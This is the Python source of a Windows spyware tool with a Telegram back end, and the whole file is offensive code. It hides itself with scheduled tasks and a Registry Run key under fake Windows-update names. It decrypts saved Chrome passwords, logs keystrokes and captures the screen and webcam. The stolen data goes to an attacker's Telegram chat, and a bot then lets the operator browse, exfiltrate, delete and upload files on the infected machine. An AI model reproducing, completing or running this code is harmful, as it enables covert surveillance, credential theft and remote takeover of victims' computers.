from dotenv import load_dotenv
load_dotenv()  # Load environment variables from .env file

import subprocess
import socket
import win32clipboard
import os
import re
import requests
import logging
import pathlib
import json
from telegram.ext import Updater, CommandHandler, MessageHandler, filters, ApplicationBuilder, ConversationHandler
from telegram import Update
import telegram
import time
import cv2
import sounddevice
import shutil
import browserhistory as bh
import sqlite3
import base64
import win32crypt
import sys
from multiprocessing import Process
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from scipy.io.wavfile import write as write_rec
from cryptography.fernet import Fernet
import tempfile
from Crypto.Cipher import AES
import winreg
import ctypes
from ctypes import wintypes


# Get Windows username dynamically
WINDOWS_USERNAME = os.getenv('USERNAME')
BASE_LOG_PATH = pathlib.Path(tempfile.gettempdir()) / 'Logs'
BASE_LOG_PATH.mkdir(parents=True, exist_ok=True)

# Telegram Configuration

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")


################ Persistence Functions - MATCHES TECHNIQUE 2 ################

def install_persistence():
    """Install persistence using Windows Task Scheduler and Registry Run keys"""
    try:
        # Get current script path
        current_script = os.path.abspath(sys.argv[0])
        
        # Check if script has .py extension
        if current_script.endswith('.py'):
            # Create a hidden copy with .pyw extension for silent execution
            script_name = os.path.basename(current_script)
            new_name = script_name.replace('.py', '.pyw')
            
            # Copy to AppData for stealth
            appdata_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Startup')
            os.makedirs(appdata_path, exist_ok=True)
            
            persistent_path = os.path.join(appdata_path, new_name)
            
            # Copy the script to AppData
            shutil.copy2(current_script, persistent_path)
            
            # Convert to .pyw if needed
            if persistent_path.endswith('.py'):
                pyw_path = persistent_path.replace('.py', '.pyw')
                os.rename(persistent_path, pyw_path)
                persistent_path = pyw_path
        else:
            persistent_path = current_script
        
        send_telegram_message("🔧 <b>Installing persistence mechanisms...</b>")
        
        # TECHNIQUE 2: Task Scheduler Persistence (Primary Method)
        try:
            # Create hidden startup task
            task_name = "WindowsSystemUpdate"
            task_command = f'wscript.exe //B //E:python "{persistent_path}"'
            
            # Create scheduled task for system startup
            startup_cmd = [
                'schtasks', '/create', '/tn', task_name,
                '/tr', task_command,
                '/sc', 'onstart',
                '/ru', 'SYSTEM',
                '/rl', 'HIGHEST',
                '/f'
            ]
            
            # Execute the command
            result = subprocess.run(startup_cmd, capture_output=True, text=True, shell=True)
            
            if result.returncode == 0:
                send_telegram_message(f"✅ <b>Task Scheduler persistence installed:</b>\nTask Name: {task_name}")
            else:
                # Try with current user if SYSTEM fails
                startup_cmd_user = [
                    'schtasks', '/create', '/tn', task_name,
                    '/tr', task_command,
                    '/sc', 'onstart',
                    '/ru', WINDOWS_USERNAME,
                    '/rl', 'HIGHEST',
                    '/f'
                ]
                subprocess.run(startup_cmd_user, capture_output=True, text=True, shell=True)
                send_telegram_message(f"✅ <b>Task Scheduler installed (User context):</b>\nTask Name: {task_name}")
        
        except Exception as e:
            send_telegram_message(f"⚠️ <b>Task Scheduler failed:</b> {str(e)[:100]}")
        
        # Create additional daily task for redundancy
        try:
            daily_task_name = "SystemHealthMonitor"
            daily_cmd = [
                'schtasks', '/create', '/tn', daily_task_name,
                '/tr', task_command,
                '/sc', 'daily',
                '/st', '00:00',
                '/f'
            ]
            subprocess.run(daily_cmd, capture_output=True, text=True, shell=True)
        except:
            pass
        
        # Additional persistence: Registry Run Key (Backup Method)
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, persistent_path)
            winreg.CloseKey(key)
            send_telegram_message("✅ <b>Registry Run key added</b>")
        except Exception as e:
            pass
        
        return True
        
    except Exception as e:
        send_telegram_message(f"❌ <b>Persistence installation failed:</b>\n{str(e)[:200]}")
        return False

def check_if_already_installed():
    """Check if persistence is already installed to avoid duplicates"""
    try:
        # Check for scheduled task
        check_cmd = 'schtasks /query /tn "WindowsSystemUpdate" 2>nul'
        result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
        return result.returncode == 0
    except:
        return False

################ Telegram Enhanced Functions ################

def send_telegram_message(text, parse_mode='HTML', chat_id=None):
    """Send formatted text message to Telegram"""
    if chat_id is None:
        chat_id = CHAT_ID
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': parse_mode
    }
    try:
        response = requests.post(url, json=payload, timeout=10)
        response.raise_for_status()
        return response.json()
    except Exception as e:
        logging.error(f'Failed to send Telegram message: {e}')
        return None

def send_telegram_file(file_path, caption="", chat_id=None):
    """Send file to Telegram with caption"""
    if chat_id is None:
        chat_id = CHAT_ID
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    
    try:
        # Check if file exists and is not empty
        if not os.path.exists(file_path):
            logging.error(f'File not found: {file_path}')
            return None
            
        if os.path.getsize(file_path) == 0:
            logging.error(f'Empty file: {file_path}')
            return None
            
        # Telegram has 50MB file size limit for documents
        if os.path.getsize(file_path) > 45 * 1024 * 1024:  # 45MB to be safe
            logging.error(f'File too large: {file_path}')
            return None
            
        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {
                'chat_id': chat_id,
                'disable_notification': True
            }
            if caption:
                data['caption'] = caption[:1024]
            
            response = requests.post(url, files=files, data=data, timeout=60)
            response.raise_for_status()
            
            # Check for Telegram API errors in response
            if not response.json().get('ok'):
                error_msg = response.json().get('description', 'Unknown Telegram API error')
                logging.error(f'Telegram API error: {error_msg}')
                return None
                
            return response.json()
            
    except requests.exceptions.HTTPError as e:
        logging.error(f'HTTP error sending {file_path}: {e.response.text}')
    except Exception as e:
        logging.error(f'Error sending {file_path}: {str(e)}')
        # Try sending as text if it's a text file
        if file_path.endswith('.txt'):
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    text_content = f.read(4096)  # First 4KB
                    return send_telegram_message(f"📄 {caption}\n{text_content}")
            except:
                pass
    return None

################ Chrome Password Extraction - FIXED VERSION ################

def get_master_key():
    """Get Chrome's master key for decrypting passwords (Chrome 80+)"""
    try:
        # Path to Chrome's Local State file
        local_state_path = os.path.join(
            os.environ['USERPROFILE'],
            'AppData', 'Local', 'Google', 'Chrome',
            'User Data', 'Local State'
        )
        
        if os.path.exists(local_state_path):
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())
            
            # Get encrypted key
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            
            # Remove the 'DPAPI' prefix (5 bytes)
            encrypted_key = encrypted_key[5:]
            
            # Decrypt using DPAPI
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
    except Exception as e:
        logging.error(f'Error getting master key: {e}')
    
    return None

def decrypt_password(encrypted_password, master_key):
    """Decrypt Chrome password using AES-GCM"""
    try:
        if not encrypted_password:
            return "[EMPTY]"
        
        # Chrome 80+ uses AES-GCM with prefix 'v10' or 'v11'
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
            # Remove the 'v10' or 'v11' prefix (3 bytes)
            encrypted_password = encrypted_password[3:]
            
            # Extract nonce (12 bytes), ciphertext, and tag (16 bytes)
            nonce = encrypted_password[:12]
            ciphertext = encrypted_password[12:-16]
            tag = encrypted_password[-16:]
            
            # Decrypt using AES-GCM
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8')
        else:
            # Old Chrome version (pre-80) - use DPAPI directly
            try:
                decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                return decrypted.decode('utf-8')
            except:
                return "[OLD VERSION - CANNOT DECRYPT]"
    except Exception as e:
        logging.error(f'Password decryption error: {e}')
        return f"[DECRYPTION FAILED: {str(e)[:50]}]"

def get_chrome_passwords():
    """Extract AND DECRYPT saved passwords from Google Chrome"""
    passwords = []
    try:
        # Get master key first
        master_key = get_master_key()
        
        if not master_key:
            logging.error("Could not get Chrome master key")
            return passwords
        
        # Chrome data path
        chrome_path = os.path.join(
            os.environ['USERPROFILE'],
            'AppData', 'Local', 'Google', 'Chrome',
            'User Data', 'Default', 'Login Data'
        )
        
        if os.path.exists(chrome_path):
            # Copy the database to avoid lock issues
            temp_db = os.path.join(str(BASE_LOG_PATH), 'chrome_passwords.db')
            shutil.copy2(chrome_path, temp_db)
            
            # Connect to the database
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Get passwords
            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created
                FROM logins 
                ORDER BY date_created DESC
            """)
            
            decrypted_count = 0
            total_count = 0
            
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                
                total_count += 1
                
                # Decrypt the password
                if encrypted_password:
                    password = decrypt_password(encrypted_password, master_key)
                    if not password.startswith('['):  # If successfully decrypted
                        decrypted_count += 1
                else:
                    password = "[EMPTY]"
                
                passwords.append({
                    'url': url,
                    'username': username,
                    'password': password,
                    'decrypted': not password.startswith('[')
                })
            
            conn.close()
            os.remove(temp_db)
            
            logging.info(f"Decrypted {decrypted_count}/{total_count} passwords successfully")
            
    except Exception as e:
        logging.error(f'Chrome password extraction error: {e}')
    
    return passwords

def extract_and_send_chrome_passwords(file_path):
    """Extract Chrome passwords and send them via Telegram"""
    try:
        send_telegram_message("🔐 <b>DECRYPTING CHROME PASSWORDS...</b>")
        
        # Get passwords
        passwords = get_chrome_passwords()
        
        if not passwords:
            send_telegram_message("❌ <b>No Chrome passwords found or could not decrypt</b>")
            return None
        
        # Save to file
        chrome_data_path = os.path.join(file_path, 'chrome_data')
        pathlib.Path(chrome_data_path).mkdir(parents=True, exist_ok=True)
        
        password_file = os.path.join(chrome_data_path, 'decrypted_passwords.txt')
        
        with open(password_file, 'w', encoding='utf-8') as f:
            # Count statistics
            decrypted_count = sum(1 for p in passwords if p['decrypted'])
            total_count = len(passwords)
            
            f.write("🎯 DECRYPTED CHROME PASSWORDS 🎯\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"✅ Decrypted: {decrypted_count}/{total_count} passwords\n")
            f.write(f"📅 Extraction Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"👤 User: {WINDOWS_USERNAME}\n")
            f.write("=" * 60 + "\n\n")
            
            # Group by website/domain
            grouped_passwords = {}
            for pwd in passwords:
                if pwd['url']:
                    domain = pwd['url'].split('/')[2] if '//' in pwd['url'] else pwd['url']
                    if domain not in grouped_passwords:
                        grouped_passwords[domain] = []
                    grouped_passwords[domain].append(pwd)
            
            # Write grouped passwords
            for domain, pwd_list in grouped_passwords.items():
                f.write(f"\n🌐 {domain}\n")
                f.write("-" * 40 + "\n")
                
                for pwd in pwd_list:
                    status = "✅" if pwd['decrypted'] else "❌"
                    f.write(f"{status} URL: {pwd['url']}\n")
                    f.write(f"   👤 Username: {pwd['username']}\n")
                    f.write(f"   🔑 Password: {pwd['password']}\n")
                    f.write("   " + "-" * 30 + "\n")
            
            # Summary of decrypted passwords
            f.write("\n" + "=" * 60 + "\n")
            f.write("🎯 IMPORTANT DECRYPTED PASSWORDS 🎯\n")
            f.write("=" * 60 + "\n\n")
            
            important_sites = ['google', 'facebook', 'instagram', 'twitter', 'github', 
                              'microsoft', 'amazon', 'paypal', 'steam', 'discord']
            
            for pwd in passwords:
                if pwd['decrypted'] and any(site in pwd['url'].lower() for site in important_sites):
                    f.write(f"🔓 {pwd['url']}\n")
                    f.write(f"   👤 {pwd['username']}\n")
                    f.write(f"   🔑 {pwd['password']}\n")
                    f.write("-" * 40 + "\n")
        
        # Send immediate summary via Telegram
        decrypted_count = sum(1 for p in passwords if p['decrypted'])
        total_count = len(passwords)
        
        summary_message = f"""
🎯 <b>CHROME PASSWORD DECRYPTION COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ <b>Successfully Decrypted:</b> {decrypted_count}/{total_count}
📊 <b>Success Rate:</b> {(decrypted_count/total_count*100):.1f}%
━━━━━━━━━━━━━━━━━━━━━━━━━━
        """
        
        send_telegram_message(summary_message)
        
        # Send the most important passwords immediately
        important_passwords = []
        for pwd in passwords:
            if pwd['decrypted']:
                important_sites = ['google.com', 'facebook.com', 'instagram.com', 
                                  'twitter.com', 'github.com', 'microsoft.com']
                if any(site in pwd['url'].lower() for site in important_sites):
                    important_passwords.append(pwd)
        
        if important_passwords:
            # Send first 5 important passwords as immediate message
            immediate_msg = "🔓 <b>IMMEDIATE ACCESS - IMPORTANT PASSWORDS:</b>\n"
            immediate_msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            
            for i, pwd in enumerate(important_passwords[:5], 1):
                immediate_msg += f"\n{i}. <code>{pwd['url']}</code>\n"
                immediate_msg += f"   👤 <b>Username:</b> <code>{pwd['username']}</code>\n"
                immediate_msg += f"   🔑 <b>Password:</b> <code>{pwd['password']}</code>\n"
            
            send_telegram_message(immediate_msg)
        
        # Send the complete file
        caption = f"""
🔓 <b>FULL CHROME PASSWORD DUMP</b>
━━━━━━━━━━━━━━━━━━━━
✅ Decrypted: {decrypted_count}/{total_count}
👤 User: {WINDOWS_USERNAME}
⏰ Time: {time.strftime('%H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━
        """
        
        send_telegram_file(password_file, caption)
        
        return password_file
        
    except Exception as e:
        logging.error(f'Chrome password extraction error: {e}')
        send_telegram_message(f"❌ <b>CHROME PASSWORD EXTRACTION FAILED:</b>\n{str(e)[:200]}")
        return None

################ Updated Main Function with Persistence ################

def main():
    try:
        # === CHECK FOR ARGUMENTS ===
        if len(sys.argv) > 1 and sys.argv[1] == "--install-only":
            # Only install persistence and exit
            install_persistence()
            return
        
        # === PHASE 0: PERSISTENCE INSTALLATION ===
        send_telegram_message("🚀 <b>SPYWARE INITIALIZATION STARTED</b>")
        
        # Check if already installed
        if not check_if_already_installed():
            install_persistence()
            send_telegram_message("✅ <b>Persistent spyware installation complete</b>")
        else:
            send_telegram_message("🔄 <b>Spyware already installed - Running scheduled execution</b>")
        
        # Create logs directory
        file_path = str(BASE_LOG_PATH)
        pathlib.Path(file_path).mkdir(parents=True, exist_ok=True)
        
        # Send initial notification
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        
        send_telegram_message(f"""
🎯 <b>TARGET ACQUIRED - PERSISTENT SPYWARE ACTIVE</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>User:</b> <code>{WINDOWS_USERNAME}</code>
💻 <b>System:</b> <code>{hostname}</code>
🌐 <b>IP:</b> <code>{IPAddr}</code>
⏰ <b>Time:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}
🚀 <b>Persistence:</b> Task Scheduler + Registry Run
━━━━━━━━━━━━━━━━━━━━━━━━━━
        """)

        # 1. SYSTEM INFORMATION
        send_telegram_message("💻 <b>Phase 1: Collecting system information...</b>")
        
        system_info_path = os.path.join(file_path, 'system_info.txt')
        with open(system_info_path, 'w', encoding='utf-8') as system_info:
            try:
                public_ip = requests.get('https://api.ipify.org', timeout=5).text
            except:
                public_ip = 'N/A'
            
            system_info.write(f"""
┌─────────────────────────────────
│ 🖥️ SYSTEM INFORMATION
├─────────────────────────────────
│ Public IP: {public_ip}
│ Private IP: {IPAddr}
│ Hostname: {hostname}
│ Username: {WINDOWS_USERNAME}
│ OS: Windows
│ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
└─────────────────────────────────
\n""")
            
            # Get network info
            system_info.write("\n🌐 NETWORK INFORMATION:\n")
            system_info.write("-" * 40 + "\n")
            try:
                subprocess.run(['ipconfig', '/all'], stdout=system_info, stderr=subprocess.DEVNULL, shell=True, text=True)
            except:
                system_info.write("Failed to get network info\n")
        
        # 2. KEYLOGGER (Short duration)
        send_telegram_message("⌨️ <b>Phase 2: Starting keylogger (60 seconds)...</b>")
        keylog_file = os.path.join(file_path, 'keylogger.txt')
        
        def quick_keylogger():
            try:
                with open(keylog_file, 'w', encoding='utf-8') as f:
                    def on_press(key):
                        try:
                            # Handle special keys and regular characters
                            if hasattr(key, 'char') and key.char:
                                char = key.char
                            elif key == Key.space:
                                char = ' '
                            elif key == Key.enter:
                                char = '\n'
                            else:
                                char = f'[{key}]'
                            
                            if char:
                                f.write(f"{time.strftime('%H:%M:%S')} - {char}\n")
                                f.flush()
                        except Exception as e:
                            logging.error(f'Key press handling error: {e}')

                    # Ensure proper listener cleanup
                    listener = Listener(on_press=on_press)
                    listener.start()
                    
                    # Log for 60 seconds
                    time.sleep(60)
                    listener.stop()
                    listener.join()
                    
                    # Verify file content
                    if os.path.getsize(keylog_file) == 0:
                        f.write("No keystrokes detected during monitoring period\n")
                        f.flush()
            except Exception as e:
                logging.error(f'Keylogger error: {e}')
                send_telegram_message(f"❌ Keylogger failed: {str(e)[:200]}")
        
        # Run keylogger in separate thread
        import threading
        keylog_thread = threading.Thread(target=quick_keylogger)
        keylog_thread.start()
        keylog_thread.join(timeout=65)
        
        # 3. SCREENSHOT AND WEBCAM CAPTURE
        send_telegram_message("📸 <b>Phase 3: Capturing images...</b>")
        screenshot_path = None
        webcam_path = None
        try:
            # Take screenshot
            screenshot_path = os.path.join(file_path, 'screenshot.png')
            pic = ImageGrab.grab()
            pic.save(screenshot_path)
            
            # Capture webcam image
            webcam = cv2.VideoCapture(0)
            ret, frame = webcam.read()
            if ret:
                webcam_path = os.path.join(file_path, 'webcam.jpg')
                cv2.imwrite(webcam_path, frame)
                send_telegram_message("✅ Screenshot and webcam image captured")
            else:
                send_telegram_message("✅ Screenshot captured, but webcam failed")
            webcam.release()
        except Exception as e:
            send_telegram_message(f"❌ Image capture failed: {str(e)}")

        # 4. EXTRACT CHROME PASSWORDS
        send_telegram_message("🔐 <b>Phase 4: Extracting Chrome passwords...</b>")
        chrome_password_file = extract_and_send_chrome_passwords(file_path)
        
        # 5. FINAL COMPILATION AND SENDING
        send_telegram_message("📦 <b>Phase 5: Compiling and sending all data...</b>")
        
        # Collect all created files
        collected_files = []
        
        # Check and add each file if it exists
        potential_files = {
            'System Info': system_info_path,
            'Keylogger Data': keylog_file,
            'Chrome Passwords': chrome_password_file,
            'Screenshot': screenshot_path,
            'Webcam Photo': webcam_path
        }
        
        for description, filepath in potential_files.items():
            if filepath and os.path.exists(filepath):
                collected_files.append((description, filepath))
        
        # Send each file
        for description, filepath in collected_files:
            try:
                caption = f"📁 <b>{description}</b>"
                send_telegram_file(filepath, caption)
                time.sleep(1)  # Avoid rate limiting
            except Exception as e:
                logging.error(f"Failed to send {description}: {e}")
                
        # 6. FINAL SUMMARY
        summary = f"""
🎉 <b>PERSISTENT SPYWARE MISSION COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>TARGET PROFILE</b>
├─ 👤 User: <code>{WINDOWS_USERNAME}</code>
├─ 💻 System: <code>{hostname}</code>
├─ 🌐 IP: <code>{IPAddr}</code>
└─ ⏰ Time: {time.strftime('%H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ <b>DATA COLLECTED:</b>
├─ 🔐 Chrome Passwords
├─ 💻 System Information
├─ ⌨️ Keystroke Logs
└─ 📸 Screenshot
━━━━━━━━━━━━━━━━━━━━━━━━━━
🔧 <b>PERSISTENCE INSTALLED:</b>
├─ ✅ Task Scheduler: WindowsSystemUpdate (On Startup)
├─ ✅ Task Scheduler: SystemHealthMonitor (Daily at 00:00)
└─ ✅ Registry Run Key: WindowsUpdateService
━━━━━━━━━━━━━━━━━━━━━━━━━━
🚨 <b>TARGET PERMANENTLY COMPROMISED</b>
• Spyware will auto-restart on reboot
• Daily data collection scheduled
• Full persistence established
━━━━━━━━━━━━━━━━━━━━━━━━━━
        """
        
        send_telegram_message(summary)
        
        # 7. START TELEGRAM BOT FOR INTERACTIVE ACCESS
        send_telegram_message("🤖 <b>Starting interactive Telegram bot...</b>")
        
        # Telegram bot code (same as before)
        current_dir = os.path.expanduser('~')
        zip_dir = os.path.join(str(BASE_LOG_PATH), 'telegram_zips')
        os.makedirs(zip_dir, exist_ok=True)

        async def start(update: Update, context):
            await update.message.reply_text(f"""
🤖 <b>Spyware Control Panel - ACTIVE</b>
━━━━━━━━━━━━━━━━━━━━━━
👤 User: {WINDOWS_USERNAME}
💻 System: {hostname}
━━━━━━━━━━━━━━━━━━━━━━
<b>Commands:</b>
/list [path] - List directory contents
/cd [path] - Change current directory
/zip [path] - Zip and send directory/file
/remove [path] - Remove file
/add - add file
Current directory: {current_dir}
            """, parse_mode='HTML')

        async def list_dir(update: Update, context):
            nonlocal current_dir
            path = ' '.join(context.args) if context.args else current_dir
            full_path = os.path.abspath(os.path.join(current_dir, path))
            
            if not os.path.exists(full_path):
                await update.message.reply_text("❌ Path does not exist")
                return

            try:
                items = []
                for entry in os.listdir(full_path):
                    entry_path = os.path.join(full_path, entry)
                    items.append(f"{'📁' if os.path.isdir(entry_path) else '📄'} {entry}")
                
                response = "\n".join(items[:50])
                if len(items) > 50:
                    response += "\n... (showing first 50 items)"
                    
                await update.message.reply_text(f"""
📂 <b>Directory Listing:</b> {full_path}
━━━━━━━━━━━━━━━━━━━━━━━━━
{response}
                """, parse_mode='HTML')
                
            except Exception as e:
                logging.error(f"List error: {e}")
                await update.message.reply_text("❌ Error listing directory")

        async def change_dir(update: Update, context):
            nonlocal current_dir
            new_dir = ' '.join(context.args) if context.args else ''
            full_path = os.path.abspath(os.path.join(current_dir, new_dir))
            
            if os.path.isdir(full_path):
                current_dir = full_path
                await update.message.reply_text(f"📂 Changed to: {current_dir}")
            else:
                await update.message.reply_text("❌ Directory does not exist")

        async def zip_dir_cmd(update: Update, context):
            target = ' '.join(context.args) if context.args else current_dir
            full_path = os.path.abspath(os.path.join(current_dir, target))
            
            if not os.path.exists(full_path):
                await update.message.reply_text("❌ Target does not exist")
                return

            try:
                base_name = os.path.basename(full_path) or "archive"
                zip_path = os.path.join(zip_dir, f"{base_name}_{int(time.time())}.zip")
                shutil.make_archive(zip_path[:-4], 'zip', full_path)
                
                with open(zip_path, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=f,
                        caption=f"📦 Zipped: {full_path}"
                    )
            except Exception as e:
                logging.error(f"Zip error: {e}")
                await update.message.reply_text("❌ Error creating zip archive")
        
        # Enhanced remove command handler (handles both files and directories)
        async def remove_file(update: Update, context):
            if not context.args:
                await update.message.reply_text("Please specify a file or directory path.")
                return
            target_path = context.args[0]
            try:
                if os.path.isfile(target_path):
                    os.remove(target_path)
                    await update.message.reply_text(f"✅ File '{target_path}' deleted successfully.")
                elif os.path.isdir(target_path):
                    shutil.rmtree(target_path)
                    await update.message.reply_text(f"✅ Directory '{target_path}' and its contents deleted successfully.")
                else:
                    await update.message.reply_text(f"❌ Path '{target_path}' does not exist.")
            except Exception as e:
                await update.message.reply_text(f"❌ Error deleting: {str(e)}")


        # Start the bot
        application = ApplicationBuilder().token(BOT_TOKEN).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("list", list_dir))
        application.add_handler(CommandHandler("cd", change_dir))
        application.add_handler(CommandHandler("zip", zip_dir_cmd))
        application.add_handler(CommandHandler("remove", remove_file))
        
        # Add command handler for file uploads
        async def add_file(update: Update, context):
            """Handler for /add command: upload a file to victim's machine"""
            # Ask user to drop the file
            await update.message.reply_text("📤 Please drop the file you want to upload")
            # Set state to wait for file
            context.user_data['expecting_file'] = True

        async def handle_document(update: Update, context):
            """Handler for document messages (file uploads)"""
            if context.user_data.get('expecting_file'):
                # Get the uploaded file
                file_id = update.message.document.file_id
                file_name = update.message.document.file_name or "uploaded_file"
                
                # Ask for destination path
                await update.message.reply_text("📁 Where should I save this file? Please provide full path:")
                # Store file info and set next state
                context.user_data['file_id'] = file_id
                context.user_data['file_name'] = file_name
                context.user_data['expecting_file'] = False
                context.user_data['expecting_destination'] = True
            elif context.user_data.get('expecting_destination'):
                # Get destination path from message
                dest_path = update.message.text.strip()
                
                # Download and save the file
                file = await context.bot.get_file(context.user_data['file_id'])
                file_path = os.path.join(dest_path, context.user_data['file_name'])
                await file.download_to_drive(file_path)
                
                await update.message.reply_text(f"✅ File saved to {file_path}")
                
                # Clear state
                context.user_data.pop('expecting_destination', None)
                context.user_data.pop('file_id', None)
                context.user_data.pop('file_name', None)

        # Register handlers
        application.add_handler(CommandHandler("add", add_file))
        application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_document))
        
        send_telegram_message("✅ <b>Interactive bot ready. Use /start to begin.</b>")
        application.run_polling()

    except Exception as e:
        logging.error(f'Error in main: {e}')
        send_telegram_message(f"🚨 <b>ERROR:</b>\n{str(e)[:200]}")

if __name__ == '__main__':
    try:
        # Test connection
        send_telegram_message("🤖 <b>SYSTEM ONLINE</b>\nStarting persistent spyware installation...")
        main()
        
    except KeyboardInterrupt:
        send_telegram_message("🛑 <b>MANUAL STOP</b>")
        
    except Exception as ex:
        send_telegram_message(f"💥 <b>CRASH:</b>\n{str(ex)[:200]}")